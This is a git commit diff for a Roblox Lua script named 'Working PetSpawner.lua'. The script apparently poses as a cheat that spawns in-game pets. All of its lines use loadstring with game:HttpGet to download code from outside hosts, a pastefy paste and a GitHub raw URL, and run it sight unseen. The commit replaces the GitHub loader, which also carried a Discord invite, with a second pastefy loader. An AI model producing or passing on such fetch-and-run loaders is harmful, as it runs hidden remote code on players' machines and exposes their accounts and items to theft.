9ee3c4eabaf04a2917ab6a24384a637241595021
ren <ikazuryzel@gmail.com>
2025-08-11 14:10:19 +0800

    Update Working PetSpawner.lua

--- Working PetSpawner.lua
+++ Working PetSpawner.lua
@@ -1,3 +1,3 @@
 loadstring(game:HttpGet("https://pastefy.app/1gXaVhk1/raw"))()
 task.wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+loadstring(game:HttpGet("https://pastefy.app/1gXaVhk1/raw"))()
